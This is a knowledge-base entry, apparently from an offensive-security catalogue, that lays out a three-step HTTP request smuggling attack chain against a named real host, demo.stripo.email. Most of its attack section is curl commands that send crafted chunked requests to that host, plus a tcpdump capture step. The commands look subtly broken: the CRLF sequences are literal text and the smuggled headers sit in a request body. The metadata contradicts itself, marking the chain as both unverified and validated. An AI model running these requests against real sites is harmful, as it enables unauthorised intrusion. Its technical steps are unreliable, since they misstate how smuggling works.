---
id: ac-001
tags:
  - http-request-smuggling
  - web-vuln
  - request-hijacking
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-HTTP-Request-Smuggling-Vulnerability]]'
  - '[[procedures/Craft-Smuggling-Request]]'
  - '[[procedures/Exploit-for-Request-Hijacking]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T09:01:21.541Z'
description: >-
  Exploitation of HTTP Request Smuggling vulnerability on a web endpoint to
  achieve request hijacking or bypass security controls
skill_level: intermediate
impact_level: medium
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# HTTP Request Smuggling on Web Endpoint Leading to Request Hijacking

Multi-stage attack chain demonstrating exploitation of an HTTP Request Smuggling vulnerability on demo.stripo.email, caused by parsing mismatches between frontend and backend servers, potentially leading to request hijacking, cache poisoning, or bypassing security controls.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance] --> B[Smuggling Craft] --> C[Exploitation]
    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- Web platform
- Accessible HTTP endpoint on demo.stripo.email
- Network access to the target

### Initial Access Requirements

- No credentials required
- External network position
- Ability to send HTTP requests

## Detailed Attack Procedures

### Step 1: Identify Vulnerability
procedure: [[procedures/Identify-HTTP-Request-Smuggling-Vulnerability]]

**Objective**: Scan and confirm the presence of HTTP Request Smuggling vulnerability due to parsing mismatches.

**Instructions**: Use [[commands/curl-http-probe]] to test the endpoint:

```bash
curl -v -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET / HTTP/1.1\r\nHost: demo.stripo.email\r\n\r\n" https://demo.stripo.email
```

**Expected Output**: Response indicating desynchronization in request parsing.

**Success Indicators**:
- Anomalous server response
- Confirmation of smuggling potential

### Step 2: Craft Smuggling Request
procedure: [[procedures/Craft-Smuggling-Request]]

**Objective**: Construct a malformed HTTP request to exploit the parsing mismatch.

**Instructions**: Build the request using [[commands/curl-smuggling]]:

```bash
curl -v --data "POST / HTTP/1.1\r\nHost: demo.stripo.email\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /secret HTTP/1.1\r\nHost: demo.stripo.email\r\n\r\n" https://demo.stripo.email
```

**Expected Output**: Smuggled request appended to the next legitimate request.

**Success Indicators**:
- Request successfully smuggled
- No immediate errors from server

### Step 3: Exploit for Hijacking
procedure: [[procedures/Exploit-for-Request-Hijacking]]

**Objective**: Hijack a subsequent request or poison cache using the smuggled content.

**Instructions**: Send the crafted request and monitor with [[commands/tcpdump-capture]]:

```bash
tcpdump -i any -w capture.pcap host demo.stripo.email
```

Follow up by analyzing the capture to confirm hijacking.

**Expected Output**: Evidence of request hijacking in network traffic.

**Success Indicators**:
- Hijacked request observed
- Potential bypass of security controls

## Attack Chain Summary

### Key Achievements

1. Identification of parsing mismatch
2. Successful smuggling of requests
3. Achievement of request hijacking

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: 2023-10-01T00:00:00Z*
